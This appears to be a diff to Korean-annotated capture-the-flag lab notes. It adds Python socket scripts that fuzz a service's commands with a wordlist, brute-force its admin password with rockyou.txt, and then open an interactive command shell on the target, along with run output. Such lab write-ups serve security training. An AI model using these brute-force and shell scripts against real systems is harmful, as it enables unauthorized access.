@@ -505,10 +505,256 @@ endpoint_list = [
 ]
 
 # 🔹 대상 서버 IP 및 포트 설정 (실제 환경에 맞게 수정 필요)
-target_ip = "10.10.154.18"
+target_ip = "10.10.247.143"
 target_port = 8000
 
 # 🔹 fuzzing 실행
 fuzz_endpoints(target_ip, target_port, endpoint_list)
 
+```
+
+Testing: some_endpoint
+Response from some_endpoint: name 'some_endpoint' is not defined
+
+Testing: shell
+Response from shell: $
+
+Testing: admin
+Response from admin: Password:
+
+Testing: backup
+Response from backup: name 'backup' is not defined
+
+Testing: reset
+Response from reset: name 'reset' is not defined
+
+Testing: login
+Response from login: name 'login' is not defined
+
+Testing: help
+Response from help:
+
+Testing: root
+Response from root: name 'root' is not defined
+
+Testing: register
+Response from register: name 'register' is not defined
+
+Testing: old
+Response from old: name 'old' is not defined
+
+```py
+import socket  # 소켓 통신을 위한 표준 라이브러리
+import os
+
+def fuzz_endpoints(ip, port, endpoints):
+    for endpoint in endpoints:
+        try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((ip, port))
+
+            print(f"Testing: {endpoint}")
+            client_socket.sendall(endpoint.encode() + b'\n')
+            response = client_socket.recv(1024)
+            print(f"Response from {endpoint}: {response.decode()}\n")
+
+            client_socket.close()
+        except Exception as e:
+            print(f"Error with {endpoint}: {e}")
+
+# 🔹 네임리스트 파일 경로 (환경에 맞게 수정)
+name_file_path = "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
+
+# 🔹 파일에서 엔드포인트 리스트 읽기
+# 각 줄에서 개행 문자 제거하고 리스트로 저장
+with open(name_file_path, "r", encoding="utf-8") as f:
+    endpoint_list = [line.strip() for line in f if line.strip()]
+
+# 대상 서버 정보
+target_ip = "10.10.247.143"
+target_port = 8000
+
+# fuzzing 실행
+fuzz_endpoints(target_ip, target_port, endpoint_list)
+```
+
+┌──(root㉿docker-desktop)-[~]
+└─# python3 fuzz_python.py
+Testing: .php
+Response from .php: invalid syntax (<string>, line 1)
+
+Testing: cgi-bin
+Response from cgi-bin: name 'cgi' is not defined
+
+Testing: images
+Response from images: name 'images' is not defined
+
+Testing: admin
+Response from admin: Password:
+
+Testing: includes
+Response from includes: name 'includes' is not defined
+
+Testing: search
+Response from search: name 'search' is not defined
+
+Testing: .html
+Response from .html: invalid syntax (<string>, line 1)
+
+Testing: cache
+Response from cache: name 'cache' is not defined
+
+Testing: login
+
+# admin, shell 반응함 -> shell $ 로 나오는데 권한이 없는 사용자는 이렇게 나옴 따라서 무시하기 -> admin 만 집중공략
+
+# pyton scrpting
+
+```py
+import socket
+
+# Configuration
+target_ip = "10.10.247.143"  # Target IP
+target_port = 8000          # Target port
+password_wordlist = "/usr/share/wordlists/rockyou.txt"  # Path to your password wordlist file
+
+def connect_and_send_password(password):
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((target_ip, target_port))
+        client_socket.sendall(b'admin\n')
+
+
+        response = client_socket.recv(1024).decode()
+        print(f"Server response after sending 'admin': {response}")
+
+        if "Password:" in response:
+            print(f"Trying password: {password}")
+            client_socket.sendall(password.encode() + b"\n")
+
+            response = client_socket.recv(1024).decode()
+
+            if response:
+                print(f"Server response for password '{password}': {response}")
+                return True
+            else:
+                print(f"Password '{password}' is incorrect or no response.")
+
+        return False
+
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+    finally:
+        client_socket.close()
+
+def fuzz_passwords():
+    with open(password_wordlist, "r", encoding="latin-1") as file:
+        passwords = file.readlines()
+
+    for password in passwords:
+        password = password.strip()  # Remove any newline characters
+
+        if connect_and_send_password(password):
+            print(f"Correct password found: {password}")
+            break
+        else:
+            print(f"Password {password} was incorrect. Reconnecting...")
+
+if __name__ == "__main__":
+    fuzz_passwords()
+
+```
+
+# 에러 발생 ! -> rockyou.txt 는 일반적으로 latin-1 인코딩 해야함 -> 현재 utf-8 이므로 latin-1 로 수정하기
+
+Traceback (most recent call last):
+File "/root/password.py", line 53, in <module>
+fuzz_passwords()
+
+```^^
+File "/root/password.py", line 41, in fuzz_passwords
+passwords = file.readlines()
+File "<frozen codecs>", line 325, in decode
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
+```
+
+# 수정 후 비밀번호 찾기 완료
+
+┌──(root㉿docker-desktop)-[~]
+└─# python3 password.py
+Server response after sending 'admin': Password:
+
+Trying password: 123456
+Server response for password '123456': Password:
+
+Correct password found: 123456
+
+```py
+import socket
+
+# Configuration
+target_ip = "10.10.247.143"  # Target IP
+target_port = 8000          # Target port
+password = "123456"         # Known password
+
+def connect_and_interact():
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((target_ip, target_port))
+
+        # Send 'admin' to the server
+        client_socket.sendall(b'admin\n')
+
+        # Receive the response from the server after sending 'admin'
+        response = client_socket.recv(1024).decode()
+        print(f"Server response after sending 'admin': {response}")
+
+        # Wait for the server to send "Password:"
+        if "Password:" in response:
+            print(f"Sending password: {password}")
+            client_socket.sendall(password.encode() + b"\n")
+
+            response = client_socket.recv(1024).decode()
+
+            if "Welcome Admin!!!" in response:
+                print(f"Server response for password '{password}': {response}")
+
+                # Send 'shell' command after receiving the welcome message
+                client_socket.sendall(b'shell\n')
+                print("Sent 'shell' command. Waiting for shell response...")
+                response = client_socket.recv(1024).decode()
+
+                if response:
+                    print(f"Shell response: {response}")
+                    interact_with_shell(client_socket)
+                else:
+                    print("No response after sending 'shell'.")
+            else:
+                print(f"Unexpected response after password: {response}")
+
+        else:
+            print("Did not receive the 'Password:' prompt.")
+
+    except Exception as e:
+        print(f"Error during connection or communication: {e}")
+
+    finally:
+        if client_socket:
+            client_socket.close()
+
+def interact_with_shell(client_socket):
+    try:
+        while True:
+            command = input("Enter command to execute: ")
+            client_socket.sendall(command.encode() + b"\n")
+            response = client_socket.recv(4096).decode()
+            print(f"Response: {response}")
+
+    except Exception as e:
+        print(f"Error during interaction: {e}")
+
+if __name__ == "__main__":
+    connect_and_interact()
 ```
